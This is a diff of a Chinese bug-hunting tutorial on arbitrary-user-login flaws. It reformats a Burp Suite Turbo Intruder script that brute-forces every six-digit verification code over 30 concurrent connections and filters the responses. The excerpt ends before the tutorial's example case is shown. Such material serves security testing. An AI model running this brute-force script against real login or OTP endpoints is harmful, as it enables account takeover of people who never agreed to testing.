@@ -1,4 +1,4 @@
-# 任意用户登录漏洞挖掘思路
+﻿# 任意用户登录漏洞挖掘思路
 
 
 <!--more-->
@@ -21,8 +21,26 @@
 
  使用burpsuite的Turbo Intruder插件，编写如下脚本：
 
-```php
-import re def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=True ) for i in range(1000000): #生成六位验证码字典 number = "{:06d}".format(i) engine.queue(target.req, number.rstrip()) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status <404: '''res = re.findall('Msg":"(.*?)"',req.response)[0] if len(res)>18:''' #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示 table.add(req)
+```python
+import re
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=30,
+                           pipeline=True
+                           )
+
+    for i in range(1000000):                            #生成六位验证码字典
+        number = "{:06d}".format(i)
+        engine.queue(target.req, number.rstrip())
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status <404:
+        '''res = re.findall('Msg":"(.*?)"',req.response)[0]    
+        if len(res)>18:'''    #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示
+        table.add(req)
 ```
 
 成功案例如下：
